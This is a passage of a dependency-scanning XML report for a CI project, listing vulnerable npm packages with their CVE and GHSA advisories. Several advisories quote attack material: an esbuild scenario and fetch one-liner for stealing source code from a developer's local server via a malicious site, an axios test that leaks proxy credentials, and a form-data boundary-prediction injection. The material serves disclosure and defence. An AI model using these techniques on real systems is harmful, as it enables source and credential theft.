confidence="HIGHEST"><source>package.json</source><name>version</name><value>3.0.2</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/braces@3.0.2</id><url>https://ossindex.sonatype.org/component/pkg:npm/braces@3.0.2?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-4068</name><severity>HIGH</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-1050</cwe></cwes><description>The NPM package `braces`, versions prior to 3.0.3, fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends &quot;imbalanced braces&quot; as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-4068?component-type=npm&amp;component-name=braces&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-4068] CWE-1050 CWE-400</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-4068</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-4068</name></reference><reference><source>OSSIndex</source><url>https://github.com/micromatch/braces/issues/35</url><name>https://github.com/micromatch/braces/issues/35</name></reference><reference><source>OSSIndex</source><url>https://github.com/micromatch/braces/pull/37</url><name>https://github.com/micromatch/braces/pull/37</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:braces:3.0.2:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-grv7-fg5c-xmjg</name><severity unscored="true">high</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-400</cwe><cwe>CWE-1050</cwe></cwes><description>The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends &quot;imbalanced braces&quot; as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.
</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/braces/issues/35</url><name>https://github.com/micromatch/braces/issues/35</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-4068</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-4068</name></reference><reference><source>NPM Advisory reference: </source><url>https://devhub.checkmarx.com/cve-details/CVE-2024-4068</url><name>https://devhub.checkmarx.com/cve-details/CVE-2024-4068</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff</url><name>https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308</url><name>https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/braces/pull/37</url><name>https://github.com/micromatch/braces/pull/37</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/braces/pull/40</url><name>https://github.com/micromatch/braces/pull/40</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-grv7-fg5c-xmjg</url><name>https://github.com/advisories/GHSA-grv7-fg5c-xmjg</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:braces:\&lt;3.0.3:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="false"><fileName>cache-posts.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/utils/cache-posts.js</filePath><md5>713461ce25b6933f70cc9547af95bd31</md5><sha1>8d8e01213a94983c497a800274e466538a858b22</sha1><sha256>2fd1b15da6f308c141e29fb19c09fa47ffb61a52e8c6c8c50cc32f1f7ef2197a</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>constants.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/utils/constants.js</filePath><md5>41ae9bdfed94fdd63b81ff81168a26d5</md5><sha1>4fa92d280bd4aaea54d31bc8f36da695a3d39e90</sha1><sha256>7fd14c311e2f810bc3d1c54c0c496feb57511311481ea5e669b6b92e90c04a94</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>cookie_options.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/utils/cookie_options.js</filePath><md5>c5a12caa580bc396270674feb5d3983e</md5><sha1>572b2622438087646bf2a1837c511ea93d7d478e</sha1><sha256>88919916ab2826ddd679129a9467402b3505f66af218481129e478bc6288af66</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>cross-spawn:7.0.3</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?cross-spawn</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>cross-spawn</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>cross-spawn</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>7.0.3</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/cross-spawn@7.0.3</id><url>https://ossindex.sonatype.org/component/pkg:npm/cross-spawn@7.0.3?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-21538</name><severity>HIGH</severity><cvssV2><score>8.699999809265137</score><accessVector>NETWORK</accessVector><accessComplexity>LOW</accessComplexity><authenticationr></authenticationr><confidentialityImpact></confidentialityImpact><integrityImpact></integrityImpact><availabilityImpact></availabilityImpact><severity>HIGH</severity><version>2.0</version></cvssV2><cwes><cwe>CWE-1333</cwe></cwes><description>Versions of the package cross-spawn before 6.0.6, from 7.0.0 and before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-21538?component-type=npm&amp;component-name=cross-spawn&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-21538] CWE-1333</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-3xgq-45jj-v275</url><name>https://github.com/advisories/GHSA-3xgq-45jj-v275</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-21538</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-21538</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:cross-spawn:7.0.3:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-3xgq-45jj-v275</name><severity unscored="true">high</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-1333</cwe></cwes><description>Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f</url><name>https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-3xgq-45jj-v275</url><name>https://github.com/advisories/GHSA-3xgq-45jj-v275</name></reference><reference><source>NPM Advisory reference: </source><url>https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230</url><name>https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/moxystudio/node-cross-spawn/issues/165</url><name>https://github.com/moxystudio/node-cross-spawn/issues/165</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff</url><name>https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/moxystudio/node-cross-spawn/pull/160</url><name>https://github.com/moxystudio/node-cross-spawn/pull/160</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-21538</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-21538</name></reference><reference><source>NPM Advisory reference: </source><url>https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349</url><name>https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd</url><name>https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:cross-spawn:\&gt;\=7.0.0\&lt;7.0.5:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="false"><fileName>db.js</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/backend/config/db.js</filePath><md5>30303fe32f803067f673162429416ef3</md5><sha1>92aa93c001f56d792a3af105a9983e608c650098</sha1><sha256>ae3b71e9610a52db46fb4c4d389899c8d39fce1793bf111cdcf16fc38375a861</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>esbuild:0.18.20</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?esbuild</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>esbuild</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>esbuild</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>0.18.20</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/esbuild@0.18.20</id><url>https://ossindex.sonatype.org/component/pkg:npm/esbuild@0.18.20?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="NPM"><name>GHSA-67mh-4wv8-2f99</name><severity unscored="true">moderate</severity><cvssV3><baseScore>5.300000190734863</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-346</cwe></cwes><description>### Summary

esbuild allows any websites to send any request to the development server and read the response due to default CORS settings.

### Details

esbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.

https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121
https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363

**Attack scenario**:

1. The attacker serves a malicious web page (`http://malicious.example.com`).
1. The user accesses the malicious web page.
1. The attacker sends a `fetch(&apos;http://127.0.0.1:8000/main.js&apos;)` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that&apos;s not the case for the reasons above.
1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.

In this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by

- Fetching `/index.html`: normally you have a script tag here
- Fetching `/assets`: it&apos;s common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files
- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource(&apos;/esbuild&apos;).addEventListener(&apos;change&apos;, e =&gt; console.log(e.type, e.data))`)
- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file

The scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.

### PoC

1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)
2. Extract it and move to that directory
1. Run `npm i`
1. Run `npm run watch`
1. Run `fetch(&apos;http://127.0.0.1:8000/app.js&apos;).then(r =&gt; r.text()).then(content =&gt; console.log(content))` in a different website&apos;s dev tools.

![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)

### Impact

Users using the serve feature may get the source code stolen by malicious websites.</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99</url><name>https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-67mh-4wv8-2f99</url><name>https://github.com/advisories/GHSA-67mh-4wv8-2f99</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d</url><name>https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:esbuild:\&lt;\=0.24.2:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="true"><fileName>follow-redirects:1.15.3</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?follow-redirects</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>follow-redirects</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>follow-redirects</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>1.15.3</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/follow-redirects@1.15.3</id><url>https://ossindex.sonatype.org/component/pkg:npm/follow-redirects@1.15.3?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-28849</name><severity>MEDIUM</severity><cvssV3><baseScore>6.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>LOW</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-200</cwe></cwes><description>follow-redirects is an open source, drop-in replacement for Node&apos;s `http` and `https` modules that automatically follows redirects. In affected versions follow-redirects only clears authorization header during cross-domain redirect, but keep the proxy-authentication header which contains credentials too. This vulnerability may lead to credentials leak, but has been addressed in version 1.15.6. Users are advised to upgrade. There are no known workarounds for this vulnerability.

Sonatype&apos;s research suggests that this CVE&apos;s details differ from those defined at NVD. See https://ossindex.sonatype.org/vulnerability/CVE-2024-28849 for details</description><references><reference><source>OSSIndex</source><url>https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-cxjh-pqwp-8mfp</url><name>https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-cxjh-pqwp-8mfp</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-28849?component-type=npm&amp;component-name=follow-redirects&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2024-28849] CWE-200: Information Exposure</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-28849</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-28849</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:follow-redirects:1.15.3:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-cxjh-pqwp-8mfp</name><severity unscored="true">moderate</severity><cvssV3><baseScore>6.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>LOW</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-200</cwe></cwes><description>When using [axios](https://github.com/axios/axios), its dependency follow-redirects only clears authorization header during cross-domain redirect, but allows the proxy-authentication header which contains credentials too.

## Steps To Reproduce &amp; PoC

Test code:

```js
const axios = require(&apos;axios&apos;);

axios.get(&apos;http://127.0.0.1:10081/&apos;, {
 headers: {
 &apos;AuThorization&apos;: &apos;Rear Test&apos;,
 &apos;ProXy-AuthoriZation&apos;: &apos;Rear Test&apos;,
 &apos;coOkie&apos;: &apos;t=1&apos;
 }
})
 .then((response) =&gt; {
 console.log(response);
 })
```

When I meet the cross-domain redirect, the sensitive headers like authorization and cookie are cleared, but proxy-authentication header is kept.

## Impact

This vulnerability may lead to credentials leak.

## Recommendations

Remove proxy-authentication header during cross-domain redirect

### Recommended Patch

[follow-redirects/index.js:464](https://github.com/follow-redirects/follow-redirects/commit/c4f847f85176991f95ab9c88af63b1294de8649b)

```diff
- removeMatchingHeaders(/^(?:authorization|cookie)$/i, this._options.headers);
+ removeMatchingHeaders(/^(?:authorization|proxy-authorization|cookie)$/i, this._options.headers);
```</description><references><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-28849</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-28849</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-cxjh-pqwp-8mfp</url><name>https://github.com/advisories/GHSA-cxjh-pqwp-8mfp</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/follow-redirects/follow-redirects/commit/c4f847f85176991f95ab9c88af63b1294de8649b</url><name>https://github.com/follow-redirects/follow-redirects/commit/c4f847f85176991f95ab9c88af63b1294de8649b</name></reference><reference><source>NPM Advisory reference: </source><url>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VOIF4EPQUCKDBEVTGRQDZ3CGTYQHPO7Z</url><name>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VOIF4EPQUCKDBEVTGRQDZ3CGTYQHPO7Z</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/psf/requests/issues/1885</url><name>https://github.com/psf/requests/issues/1885</name></reference><reference><source>NPM Advisory reference: </source><url>https://hackerone.com/reports/2390009</url><name>https://hackerone.com/reports/2390009</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-cxjh-pqwp-8mfp</url><name>https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-cxjh-pqwp-8mfp</name></reference><reference><source>NPM Advisory reference: </source><url>https://fetch.spec.whatwg.org/#authentication-entries</url><name>https://fetch.spec.whatwg.org/#authentication-entries</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:follow-redirects:\&lt;\=1.15.5:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2023-26159</name><severity>MEDIUM</severity><cvssV3><baseScore>6.099999904632568</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>CHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-20</cwe></cwes><description>Versions of the package follow-redirects before 1.15.4 are vulnerable to Improper Input Validation due to the improper handling of URLs by the url.parse() function. When new URL() throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches.</description><references><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-26159</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-26159</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2023-26159?component-type=npm&amp;component-name=follow-redirects&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url><name>[CVE-2023-26159] CWE-20: Improper Input Validation</name></reference><reference><source>OSSIndex</source><url>https://github.com/follow-redirects/follow-redirects/issues/235</url><name>https://github.com/follow-redirects/follow-redirects/issues/235</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:follow-redirects:1.15.3:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-jchw-25xp-jwwc</name><severity unscored="true">moderate</severity><cvssV3><baseScore>6.099999904632568</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>CHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-601</cwe><cwe>CWE-20</cwe></cwes><description>Versions of the package follow-redirects before 1.15.4 are vulnerable to Improper Input Validation due to the improper handling of URLs by the url.parse() function. When new URL() throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches.</description><references><reference><source>NPM Advisory reference: </source><url>https://security.snyk.io/vuln/SNYK-JS-FOLLOWREDIRECTS-6141137</url><name>https://security.snyk.io/vuln/SNYK-JS-FOLLOWREDIRECTS-6141137</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-jchw-25xp-jwwc</url><name>https://github.com/advisories/GHSA-jchw-25xp-jwwc</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2023-26159</url><name>https://nvd.nist.gov/vuln/detail/CVE-2023-26159</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/follow-redirects/follow-redirects/issues/235</url><name>https://github.com/follow-redirects/follow-redirects/issues/235</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/follow-redirects/follow-redirects/commit/7a6567e16dfa9ad18a70bfe91784c28653fbf19d</url><name>https://github.com/follow-redirects/follow-redirects/commit/7a6567e16dfa9ad18a70bfe91784c28653fbf19d</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/follow-redirects/follow-redirects/pull/236</url><name>https://github.com/follow-redirects/follow-redirects/pull/236</name></reference><reference><source>NPM Advisory reference: </source><url>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZZ425BFKNBQ6AK7I5SAM56TWON5OF2XM/</url><name>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZZ425BFKNBQ6AK7I5SAM56TWON5OF2XM/</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:follow-redirects:\&lt;1.15.4:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="true"><fileName>form-data:4.0.0</fileName><filePath>/var/lib/jenkins/workspace/wanderlust-CI/frontend/package-lock.json?form-data</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>form-data</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>form-data</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>4.0.0</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/form-data@4.0.0</id><url>https://ossindex.sonatype.org/component/pkg:npm/form-data@4.0.0?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=12.1.3</url></package></identifiers><vulnerabilities><vulnerability source="NPM"><name>GHSA-fjxv-7rqg-78g4</name><severity unscored="true">critical</severity><cwes><cwe>CWE-330</cwe></cwes><description>### Summary

form-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:
1. can observe other values produced by Math.random in the target application, and
2. can control one field of a request made using form-data

Because the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data&apos;s boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.

This is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I&apos;m not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.

### Details

The culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347

An attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))

### PoC

PoC here: https://github.com/benweissmann/CVE-2025-7783-poc

Instructions are in that repo. It&apos;s based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). 

### Impact

For an application to be vulnerable, it must:
- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system&apos;s handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)
- Reveal values of Math.random(). It&apos;s easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. 

If an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-fjxv-7rqg-78g4</url><name>https://github.com/advisories/GHSA-fjxv-7rqg-78g4</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/benweissmann/CVE-2025-7783-poc</url><name>https://github.com/benweissmann/CVE-2025-7783-poc</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0</url><name>https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4</url><name>https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4</name></reference><reference><source>NPM Advisory reference: 